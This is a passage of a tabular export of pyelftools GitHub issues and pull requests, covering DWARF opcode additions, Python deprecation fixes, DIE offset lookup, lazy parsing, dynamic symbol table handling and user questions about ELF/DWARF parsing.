See DWARFv5, 7.7.1.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/240/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/240/comments,https://api.github.com/repos/eliben/pyelftools/issues/240/events,https://github.com/eliben/pyelftools/pull/240,https://api.github.com/repos/eliben/pyelftools/pulls/240
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/239,494351045,MDExOlB1bGxSZXF1ZXN0MzE4MTIxNDM2,239,"dwarf_expr: Add DW_OP_{lo,hi}_user",3059210,closed,FALSE,NA,NA,2,2019-09-17T01:18:37Z,2019-09-18T12:21:43Z,2019-09-18T12:21:43Z,CONTRIBUTOR,NA,"Adds `DW_OP_lo_user` and `DW_OP_hi_user`.

From DWARFv4 7.1 and 7.7.1:

> Values in the range between prefix_lo_user and prefix_hi_user inclusive, are reserved for vendor specific extensions. Vendors may use values in this range without conflicting with current or future system-defined values. All other values are reserved for use by the system.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/239/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/239/comments,https://api.github.com/repos/eliben/pyelftools/issues/239/events,https://github.com/eliben/pyelftools/pull/239,https://api.github.com/repos/eliben/pyelftools/pulls/239
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/238,481502461,MDU6SXNzdWU0ODE1MDI0NjE=,238,"is there a way we can know the size of array declared with ""extern type array[]"" with pyelftools ",48015629,closed,FALSE,NA,NA,2,2019-08-16T08:30:47Z,2020-05-21T18:24:43Z,2020-05-21T18:24:43Z,NONE,NA,"Is there a way that we can know the size of array declared with ""extern type array[]"" in file example.h and defined with ""type array[ARRAY_SIZE]"" in example.c, and example.c will include example.h. With pyelftools, I analyze all the attributes of array, still can't find the way to calculate the size of array, so is this a bug or I miss someting? Thanks for the help!


Thanks
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/238/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/238/comments,https://api.github.com/repos/eliben/pyelftools/issues/238/events,https://github.com/eliben/pyelftools/issues/238,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/237,477720875,MDExOlB1bGxSZXF1ZXN0MzA0OTkwMDc1,237,Fix deprecation warning in Python 3.7,16979510,closed,FALSE,NA,NA,2,2019-08-07T05:52:17Z,2019-09-11T13:03:00Z,2019-09-11T13:03:00Z,NONE,NA,based on the fix from #231 ,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/237/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/237/comments,https://api.github.com/repos/eliben/pyelftools/issues/237/events,https://github.com/eliben/pyelftools/pull/237,https://api.github.com/repos/eliben/pyelftools/pulls/237
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/236,475708652,MDExOlB1bGxSZXF1ZXN0MzAzNDA2MTA4,236,dwarf_cu: Add DIE lookup through offset,816362,closed,FALSE,NA,NA,2,2019-08-01T14:15:10Z,2019-08-02T16:13:33Z,2019-08-02T16:13:32Z,NONE,NA,"This allows for easier lookup of chained DIE entries.

As a motivating example, we can easily retrieve the type information from a variable in the `.debug_info` section.

If part of the section looks like the following (taken from `objdump`), with a variable `z` at offset `<a7>`:

```
Contents of the .debug_info section:

  Compilation Unit @ offset 0x0:
   Length:        0xd0 (32-bit)
   Version:       4
   Abbrev Offset: 0x0
   Pointer Size:  8
 <0><b>: Abbrev Number: 1 (DW_TAG_compile_unit)
...
 <2><a7>: Abbrev Number: 4 (DW_TAG_variable)
    <a8>   DW_AT_location    : 2 byte block: 91 7c      (DW_OP_fbreg: -4)
    <ab>   DW_AT_name        : (indirect string, offset: 0xe0): z
    <af>   DW_AT_decl_file   : 1
    <b0>   DW_AT_decl_line   : 36
    <b1>   DW_AT_type        : <0xb6>
 <2><b5>: Abbrev Number: 0
 <1><b6>: Abbrev Number: 6 (DW_TAG_base_type)
    <b7>   DW_AT_name        : (indirect string, offset: 0xc1): int
    <bb>   DW_AT_encoding    : 5        (signed)
    <bc>   DW_AT_byte_size   : 4
 <1><bd>: Abbrev Number: 7 (DW_TAG_pointer_type)
    <be>   DW_AT_type        : <0xc2>
 <1><c2>: Abbrev Number: 7 (DW_TAG_pointer_type)
    <c3>   DW_AT_type        : <0xc7>
 <1><c7>: Abbrev Number: 8 (DW_TAG_const_type)
    <c8>   DW_AT_type        : <0xcc>
 <1><cc>: Abbrev Number: 6 (DW_TAG_base_type)
    <cd>   DW_AT_name        : (indirect string, offset: 0xd7): char
    <d1>   DW_AT_encoding    : 6        (signed char)
    <d2>   DW_AT_byte_size   : 1
 <1><d3>: Abbrev Number: 0
```

Then, we can, given the DIE entry, `die`, for our variable `z`, execute the following to retrieve type information:

```python
type_entry = die.attributes[""DW_AT_type""]
type_die = die.cu.die_from_offset(type_entry.value)
print({
    ""name"": type_die.attributes[""DW_AT_name""].value.decode(""utf8""),
    ""encoding"": type_die.attributes[""DW_AT_encoding""].value,
    ""byte_size"": type_die.attributes[""DW_AT_byte_size""].value
})
```

of course, a more robust type-resolution function would have to check the `DW_TAG_*` values and perform lookups until a `DW_TAG_base_type` is reached (or other base tag), or the DIE does not have a `DW_AT_type` attribute.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/236/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/236/comments,https://api.github.com/repos/eliben/pyelftools/issues/236/events,https://github.com/eliben/pyelftools/pull/236,https://api.github.com/repos/eliben/pyelftools/pulls/236
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/235,472106837,MDU6SXNzdWU0NzIxMDY4Mzc=,235,Deprecation warning in Python 3.7 on elftools\dwarf\namelut.py,50658273,closed,FALSE,NA,NA,7,2019-07-24T06:41:48Z,2019-10-05T13:15:59Z,2019-10-05T13:15:59Z,NONE,NA,"This is the extended message:
elftools\dwarf\namelut.py:19: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated, and in 3.8 it will stop working
    class NameLUT(collections.Mapping):

I've seen that something similar was fixed: https://github.com/eliben/pyelftools/pull/231, but some models failed to be updated also.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/235/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/235/comments,https://api.github.com/repos/eliben/pyelftools/issues/235/events,https://github.com/eliben/pyelftools/issues/235,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/234,469470816,MDExOlB1bGxSZXF1ZXN0Mjk4Njg3Nzg0,234,dwarf/descriptions: Remove DW_LANG_Upc,3059210,closed,FALSE,NA,NA,2,2019-07-17T22:09:47Z,2019-07-18T15:45:08Z,2019-07-18T13:29:01Z,CONTRIBUTOR,NA,"The standard defines only `DW_LANG_UPC` (correctly declared above), and this value also contained a typo (missing ""U"").",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/234/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/234/comments,https://api.github.com/repos/eliben/pyelftools/issues/234/events,https://github.com/eliben/pyelftools/pull/234,https://api.github.com/repos/eliben/pyelftools/pulls/234
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/233,469466356,MDExOlB1bGxSZXF1ZXN0Mjk4Njg0NzEw,233,"dwarf_expr: Add DW_OP_{implicit,stack}_value",3059210,closed,FALSE,NA,NA,0,2019-07-17T21:57:37Z,2019-07-18T15:45:26Z,2019-07-18T13:28:23Z,CONTRIBUTOR,NA,"Adds `DW_OP_implicit_value` and `DW_OP_stack_value`, which can be found in DWARF v4 2.6.1.1.3:

> An implicit location description represents a piece or all of an object which has no actual
location but whose contents are nonetheless either known or known to be undefined. 
> The following DWARF operations may be used to specify a value that has no location in the
program but is a known constant or is computed from other locations and values in the program. ",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/233/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/233/comments,https://api.github.com/repos/eliben/pyelftools/issues/233/events,https://github.com/eliben/pyelftools/pull/233,https://api.github.com/repos/eliben/pyelftools/pulls/233
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/232,467341020,MDExOlB1bGxSZXF1ZXN0Mjk3MDExOTY1,232,Fix for `CFIEntry.get_decoded()`,22766161,closed,FALSE,NA,NA,3,2019-07-12T10:27:57Z,2019-07-30T03:11:39Z,2019-07-30T03:11:39Z,CONTRIBUTOR,NA,"* add test that detects an error
* fixup",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/232/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/232/comments,https://api.github.com/repos/eliben/pyelftools/issues/232/events,https://github.com/eliben/pyelftools/pull/232,https://api.github.com/repos/eliben/pyelftools/pulls/232
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/231,458859755,MDExOlB1bGxSZXF1ZXN0MjkwMzYyODE3,231,Fix deprecation warning in Python 3.7,86350,closed,FALSE,NA,NA,6,2019-06-20T20:29:39Z,2019-06-25T19:49:08Z,2019-06-22T12:16:24Z,CONTRIBUTOR,NA,"```
$SITE_PYTHON/lib/python3.7/site-packages/elftools/construct/lib/container.py:5
 Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated, and in 3.8 it will stop working
```

This change is compatible with Python 3.3 and up, when the ABCs were moved to collections.abc.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/231/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/231/comments,https://api.github.com/repos/eliben/pyelftools/issues/231/events,https://github.com/eliben/pyelftools/pull/231,https://api.github.com/repos/eliben/pyelftools/pulls/231
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/230,457143658,MDU6SXNzdWU0NTcxNDM2NTg=,230,GCC 8.2.0 Compatibility,51930013,open,FALSE,NA,NA,6,2019-06-17T20:53:53Z,2020-04-22T23:56:16Z,NA,NONE,NA,"Hello,

I have been utilizing pyelftools (0.24) to analyze the dwarf symbols of executables compiled with gcc 4.9.2.  As of right now I am testing stepping up to gcc 8.2.0 but am running into an ""expected 4, found 0"" error when parsing the data.  Looking at the objdump files that are attached, it seems the 8.2.0 version of the object file has some extra entries with Abrev Number: 0 that are throwing pyelftools off.

Both of the files were compiled with the following command:
gcc -m32 -gdwarf-2 -c -x c++ -fno-eliminate-unused-debug-types example.hpp

On the python end I am utilizing:
ELFFile.get_dwarf_info() to access the dwarf data.

Are there any known limitations to which gcc versions pyeftools supports?  Is there a workaround or something I am missing?

[dump_4.9.2.txt](https://github.com/eliben/pyelftools/files/3298763/dump_4.9.2.txt)
[dump_8.2.0.txt](https://github.com/eliben/pyelftools/files/3298764/dump_8.2.0.txt)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/230/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/230/comments,https://api.github.com/repos/eliben/pyelftools/issues/230/events,https://github.com/eliben/pyelftools/issues/230,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/229,456063635,MDU6SXNzdWU0NTYwNjM2MzU=,229,Does it support ELF editing?,1357701,closed,FALSE,NA,NA,1,2019-06-14T05:13:13Z,2019-06-17T12:14:46Z,2019-06-15T13:44:25Z,NONE,NA,"Is it possible to parse an ELF, modify the header fields an export the new ELF with pyelftools? Can you add some example code?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/229/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/229/comments,https://api.github.com/repos/eliben/pyelftools/issues/229/events,https://github.com/eliben/pyelftools/issues/229,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/228,452719010,MDU6SXNzdWU0NTI3MTkwMTA=,228,Simple example for reading string literals based  on address,12736113,closed,FALSE,NA,NA,1,2019-06-05T21:10:55Z,2019-06-06T19:11:28Z,2019-06-06T19:11:28Z,NONE,NA,"Add simple example for reading string literals from address.
I have some experience of elf files and have logging mechanism which passes the pointer to the string literal.
An example of how to read the string from the elf based on the address would help clarify how to use the pyelftools.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/228/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/228/comments,https://api.github.com/repos/eliben/pyelftools/issues/228/events,https://github.com/eliben/pyelftools/issues/228,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/227,442663527,MDU6SXNzdWU0NDI2NjM1Mjc=,227,Simple example for reading content of static variables,32884309,closed,FALSE,NA,NA,1,2019-05-10T11:06:27Z,2020-02-04T14:26:25Z,2020-02-04T14:26:25Z,NONE,NA,"Hi, 

i'm new the pyelftools and wanted to ask you guys, if somebody can give an example how to parse the content in an elf-File for a static variables.

For example I have a static uint32_t timestamp = 0x1234; in my code, how can I read out the address and the initial value of that variable?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/227/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/227/comments,https://api.github.com/repos/eliben/pyelftools/issues/227/events,https://github.com/eliben/pyelftools/issues/227,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/226,441349442,MDU6SXNzdWU0NDEzNDk0NDI=,226,readelf .txt output is missing information while ARM Compiler .txt output is complete,50376947,open,FALSE,NA,NA,1,2019-05-07T17:27:03Z,2020-02-04T14:28:07Z,NA,NONE,NA,"Dear all,

 

I hope you can help me. I am quite new on the topic.

 

I am working on an .axf  file which was transformed in a text file in order to get the DWARF information. I have done this operation two times: once with a fromelf.exe  ARM Compiler (version 5.06 update 6, build 750) file and once, using readelf.py. (pyelftools)

 

In the .debug_info section of the two text files I target a structure called ""MyStructure"" which has a DW_AT_type indirect DW_FORM_ref_addr 0x3dc. If I then move to the address 0x3dc, I discover that in the file create by the .exe the information is complete while in the other file something looks missing.

-------------------------------------------------------------------------------------------------------------------------------

#1 way trough .exe

 

DW_AT_type indirect DW_FORM_ref2 0xa2 (0x3ae)

 

With the address 0x3ae I am able to arrive to the basetype...

-------------------------------------------------------------------------------------------------------------------------------

#2 way trough readelf.py 

 

DW_AT_type        : 162

 

 

If I go to the address 0x3dc in the readelf.py text the information is not complete  

-------------------------------------------------------------------------------------------------------------------------------

 

So it looks like there is something missing and unfortunately I am working on create a small code in python which is able to take as an input the name of the structure and the variable and arrive to the base type of it and get some information

 

Do you know if there is any way of getting this address (0x3ae) which I am missing and is not letting me arrive to the base type?

 

 

I have attached the files I have used:

 

simple. axf                        is the binary file

 

simple_dump.txt               is the file created by the fromelf.exe

 

simple_readelf.txt             is the file created by the readelf.py  


Thank you in advance 


[simple.txt](https://github.com/eliben/pyelftools/files/3153816/simple.txt)
[simple_dump.txt](https://github.com/eliben/pyelftools/files/3153817/simple_dump.txt)
[simple_readelf.txt](https://github.com/eliben/pyelftools/files/3153818/simple_readelf.txt)





",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/226/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/226/comments,https://api.github.com/repos/eliben/pyelftools/issues/226/events,https://github.com/eliben/pyelftools/issues/226,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/225,439306624,MDExOlB1bGxSZXF1ZXN0Mjc1MTQyNTA1,225,Improved handling of location information,955258,closed,FALSE,NA,NA,1,2019-05-01T20:16:03Z,2019-08-02T13:56:50Z,2019-08-02T13:56:50Z,CONTRIBUTOR,NA,"This commit moves some of the location-handling code from the examples
to a new class (LocationParser) in order to make it more reusable.

Also adds two test files containing location information.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/225/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/225/comments,https://api.github.com/repos/eliben/pyelftools/issues/225/events,https://github.com/eliben/pyelftools/pull/225,https://api.github.com/repos/eliben/pyelftools/pulls/225
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/224,435369079,MDU6SXNzdWU0MzUzNjkwNzk=,224,errow while building,23319001,closed,FALSE,NA,NA,2,2019-04-20T08:03:26Z,2019-04-20T13:08:32Z,2019-04-20T12:56:02Z,NONE,NA,"debian@debian:~/Desktop/temp/elf_purser/pyelftools-master$ python setup.py install
Traceback (most recent call last):
  File ""setup.py"", line 10, in <module>
    from setuptools import setup
ImportError: No module named setuptools",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/224/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/224/comments,https://api.github.com/repos/eliben/pyelftools/issues/224/events,https://github.com/eliben/pyelftools/issues/224,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/223,434072732,MDExOlB1bGxSZXF1ZXN0MjcxMTQyMzY5,223,utilizing package name spaces for convenient imports ,23250905,closed,FALSE,NA,NA,0,2019-04-17T03:13:57Z,2019-04-19T16:12:17Z,2019-04-19T16:11:50Z,NONE,NA,"This PR only introduces changes to `__init__.py` in pyelftools packages. This PR does not introduce any new functionality but potential to import make the tool more usable with other python applications.
Closes #222 ",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/223/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/223/comments,https://api.github.com/repos/eliben/pyelftools/issues/223/events,https://github.com/eliben/pyelftools/pull/223,https://api.github.com/repos/eliben/pyelftools/pulls/223
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/222,434012971,MDU6SXNzdWU0MzQwMTI5NzE=,222,Expose public objects in namespace,23250905,closed,FALSE,NA,NA,1,2019-04-16T22:28:53Z,2019-04-19T16:11:39Z,2019-04-19T16:11:39Z,NONE,NA,"In [This use case](https://github.com/trailofbits/manticore/blob/master/manticore/binary/binary.py) in order to import ELFFile, you must either do this or `from elftools.elf import elffile #elffile.ELFFile`. Neither or which are absolute imports to the object in question. This issue highlights the `__init__.py` file not being utilized in a featured use case. Ideally all packages should have an `__all__` variable denoting what `from . import *` imports and take advantage of the namespace, e.g. adding `from .elffile import ELFFile`  to `elftools.elf.__init__.py` would make the following legal: ` from elftools.elf import ELFFile`.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/222/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/222/comments,https://api.github.com/repos/eliben/pyelftools/issues/222/events,https://github.com/eliben/pyelftools/issues/222,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/221,419110381,MDExOlB1bGxSZXF1ZXN0MjU5NzEzMDAw,221,Fix LookupError when testing with tox,75449,closed,FALSE,NA,NA,1,2019-03-09T20:07:02Z,2019-12-22T07:53:37Z,2019-03-11T13:28:26Z,CONTRIBUTOR,NA,"On macOS I'm getting the following error when testing with tox on py27:

```
ERROR: invocation failed (exit code 1), logfile: /devel/pyelftools/.tox/py27/log/py27-33.log
ERROR: actionid: py27
msg: installpkg
cmdargs: ['/devel/pyelftools/.tox/py27/bin/pip', 'install', '-U', '--no-deps', '/devel/pyelftools/.tox/dist/pyelftools-0.25.zip']

DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won't be maintained after that date. A future version of pip will drop support for Python 2.7.
Processing ./.tox/dist/pyelftools-0.25.zip
    Complete output from command python setup.py egg_info:
    Traceback (most recent call last):
      File ""<string>"", line 1, in <module>
      File ""/private/var/folders/qz/XXX/T/pip-req-build-890d2p/setup.py"", line 47, in <module>
        scripts=['scripts/readelf.py']
      File ""/devel/pyelftools/.tox/py27/lib/python2.7/site-packages/setuptools/__init__.py"", line 144, in setup
        _install_setup_requires(attrs)
      File ""/devel/pyelftools/.tox/py27/lib/python2.7/site-packages/setuptools/__init__.py"", line 137, in _install_setup_requires
        dist.parse_config_files(ignore_option_errors=True)
      File ""/devel/pyelftools/.tox/py27/lib/python2.7/site-packages/setuptools/dist.py"", line 704, in parse_config_files
        self._parse_config_files(filenames=filenames)
      File ""/devel/pyelftools/.tox/py27/lib/python2.7/site-packages/setuptools/dist.py"", line 600, in _parse_config_files
        reader = io.TextIOWrapper(fp, encoding=encoding)
    LookupError: unknown encoding:
```

This is due to the specification of LC_ALL as simply `en_US` without an encoding. Python 3.x seems to be fine with this, but Python 2.7 barfs. As a fix, setting `LC_ALL` to `en_US.utf-8` (including an explicit encoding spec) works.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/221/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/221/comments,https://api.github.com/repos/eliben/pyelftools/issues/221/events,https://github.com/eliben/pyelftools/pull/221,https://api.github.com/repos/eliben/pyelftools/pulls/221
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/220,416993775,MDExOlB1bGxSZXF1ZXN0MjU4MDkwMzE5,220,Add ability to parse the NT_FILE note found in core files,6891272,closed,FALSE,NA,NA,0,2019-03-04T21:09:49Z,2019-04-22T12:07:27Z,2019-04-22T12:07:27Z,CONTRIBUTOR,NA,"Hi, 

I've been having a play with this library to poke around some core files to learn about their structure. I've found it very useful and so wanted to contribute in a small way. I've put together a pull request that adds the ability to read the NT_FILE part of the PT_NOTE that can be found  within core files. I've added some structs to parse it when the it detects that it has come across the NT_FILE note.

My research into the structure of the note has come from reading:
- https://www.gabriel.urdhr.fr/2015/05/29/core-file/ <- an excellent introduction to core file structure
- https://chromium.googlesource.com/native_client/nacl-binutils/+/upstream/master/binutils/readelf.c

I have added a test in test/test_core_notes.py that checks that the parsed note matches the output of the eu-readelf tool for NT_FILE.

Python is very much a language I'm still learning but I have tried to adhere to PEP8 guidelines in the added code. I noticed that the 79 char limit isn't strictly followed in all of the code but I have stuck to it in my changes; personally I am a PyCharm IDE user and prefer having longer lines but I'd rather not cause problems for hardcore terminal users. I'd appreciate any feedback on the changes

tox ouput looks good on my machine
```
Conclusion: SUCCESS
summary
  py27: commands succeeded
  py35: commands succeeded
  congratulations :)
```",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/220/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/220/comments,https://api.github.com/repos/eliben/pyelftools/issues/220/events,https://github.com/eliben/pyelftools/pull/220,https://api.github.com/repos/eliben/pyelftools/pulls/220
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/219,413139418,MDExOlB1bGxSZXF1ZXN0MjU1MTk0NDI3,219,Improve symbol table handling in DynamicSegment,6428272,closed,FALSE,NA,NA,10,2019-02-21T21:49:20Z,2019-03-19T01:48:20Z,2019-03-19T01:48:20Z,CONTRIBUTOR,NA,"In ultra-stripped binaries the only information about a (dynamic) symbol table comes from the dynamic segment. The DT_SYMTAB tag holds the base address of the table but no tag exists for the number of symbols in the table. The current approach tries to guess this number by looking for the nearest pointer bigger than the DT_SYMTAB pointer in all dynamic tags. However, some of these entries are size values (DT_STRSZ, DT_RELASZ,...) and the heuristic may wrongly interpret them as pointers, which makes DynamicSegment.iter_symbols() return a too low number of symbols.

This change improves the detection by gathering information from the DT_GNU_HASH or DT_HASH symbol hash tables, relying on the fact that every symbol must have a corresponding hash in order for the dynamic loader to properly resolve symbols during loading. The change is inspired by the code used by https://github.com/chromium/crashpad (introduced in [this change]).

Additionally, DynamicSegment only had the iter_symbols() so far, whereas the regular SymbolTableSection also has access to the number of symbols, a specific symbol by index and lookup for symbols by name. I ported these features to DynamicSegment as well.

I noticed that SymbolTableSection.iter_symbols() deliberately leaves out the first entry of the symbol table (which is a STT_NOTYPE entry anyway) while DynamicSegment.iter_symbols() doesn't... should we make this consistent as well? Or is the risk of breaking existing tools using DynamicSegment too high?

Fixes: #218

[this change]: https://github.com/chromium/crashpad/commit/1f1657d573c789aa36b6022440e34d9ec30d894c",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/219/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/219/comments,https://api.github.com/repos/eliben/pyelftools/issues/219/events,https://github.com/eliben/pyelftools/pull/219,https://api.github.com/repos/eliben/pyelftools/pulls/219
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/218,412817285,MDU6SXNzdWU0MTI4MTcyODU=,218,DynamicSegment.iter_symbols() might terminate early,6428272,closed,FALSE,NA,NA,1,2019-02-21T09:06:24Z,2019-03-19T01:48:19Z,2019-03-19T01:48:19Z,CONTRIBUTOR,NA,"The following code in DynamicSegment.iter_symbols() might return a too low number of entries for the dynamic symbol table.
 https://github.com/eliben/pyelftools/blob/60319cbb9d469e8d7c56e8f85dd55294c0ce4f62/elftools/elf/dynamic.py#L204-L224

It tries to find the next pointer bigger than the beginning of the symbol table (indicated by the 'DT_SYMTAB' dynamic tag) and uses it as the end of the table. For shared libraries or PIE executables with a load offset of 0, **pointers** to e.g. 'DT_SYMTAB' are something like 0x380 which is in a range where tags like 'DT_STRSZ' or 'DT_RELASZ' have their **value**. However, this code does not make any distinction between value and pointer tags (and it seems there is no generic way to do so anyway) so it might use a size value as the (wrong) end of the symbol table.

Other projects (such as https://github.com/chromium/crashpad) use the information in 'DT_HASH' or 'DT_GNU_HASH' to compute the number of elements in the symbol table as every symbol has a hash associated to it (see the change set introducing this at https://github.com/chromium/crashpad/commit/1f1657d573c789aa36b6022440e34d9ec30d894c)

Should I implement something similar here as well? Additionally, we might also want to provide a DynamicSegment.get_symbol(n) function similar to the regular symbol table.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/218/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/218/comments,https://api.github.com/repos/eliben/pyelftools/issues/218/events,https://github.com/eliben/pyelftools/issues/218,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/217,410910191,MDExOlB1bGxSZXF1ZXN0MjUzNTM2NjIx,217,Also decode strings in _DynamicStringTable.get_string(),6428272,closed,FALSE,NA,NA,1,2019-02-15T19:24:29Z,2019-02-16T13:26:08Z,2019-02-16T13:26:00Z,CONTRIBUTOR,NA,"StringTableSection.get_string() returns an UTF-8 decoded
string (or '' if fetching the string failed) since #182
but the code in _DynamicStringTable was never updated to
decode anything at all so it just returns a bytes sequence
in Python 3.

Let's convert the string there as well to be able to use
both string tables the same way without having to worry
about decoding. Adapt the test cases accordingly.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/217/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/217/comments,https://api.github.com/repos/eliben/pyelftools/issues/217/events,https://github.com/eliben/pyelftools/pull/217,https://api.github.com/repos/eliben/pyelftools/pulls/217
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/216,405704049,MDExOlB1bGxSZXF1ZXN0MjQ5NjA1MDM5,216,Lazy parsing,14236428,closed,FALSE,NA,NA,11,2019-02-01T13:34:43Z,2019-11-08T03:07:29Z,2019-11-08T03:07:29Z,CONTRIBUTOR,NA,"Recently, I used `pyelftools` in a debugger. During my work I faced a problem.
`pyelftools` parses much of debug info when the debugger just looks for a
few things. E.g. when the debugger looks for a DIE describing a variable,
entire CU (all its DIEs) is parsed. When working with a big binary (like
[Qemu](https://www.qemu.org/) emulator) debugger loading consumes about
5 minutes which is very annoying to a user.

The solution I suggest is lazy parsing. This patch series reworks some internals
of the library so it only parses requested things.

Also, because an ELF file is considered constant, there is no a reason to parse
things twice. So, I also added some caches for parsed entities.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/216/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/216/comments,https://api.github.com/repos/eliben/pyelftools/issues/216/events,https://github.com/eliben/pyelftools/pull/216,https://api.github.com/repos/eliben/pyelftools/pulls/216
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/215,404328762,MDExOlB1bGxSZXF1ZXN0MjQ4NTM1NTc2,215,Fixup error on empty .debug_pubtypes section,14236428,closed,FALSE,NA,NA,0,2019-01-29T14:53:03Z,2019-01-31T14:17:15Z,2019-01-31T14:17:15Z,CONTRIBUTOR,NA,"Sometimes, `-gpubnames` option for gcc results in empty "".debug_pubtypes"". section.
That section only contains single zero entry for a CU. This entry is incorrectly handled by
current `NameLUT` implementation.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/215/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/215/comments,https://api.github.com/repos/eliben/pyelftools/issues/215/events,https://github.com/eliben/pyelftools/pull/215,https://api.github.com/repos/eliben/pyelftools/pulls/215
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/214,403574178,MDExOlB1bGxSZXF1ZXN0MjQ3OTY3OTc2,214,Support for DWARFv4 location lists in dwarf_location_lists.py,955258,closed,FALSE,NA,NA,4,2019-01-27T17:23:04Z,2019-01-31T14:18:38Z,2019-01-30T14:33:04Z,CONTRIBUTOR,NA,"In DWARFv4 the location lists are referenced with the 'sec_offset'
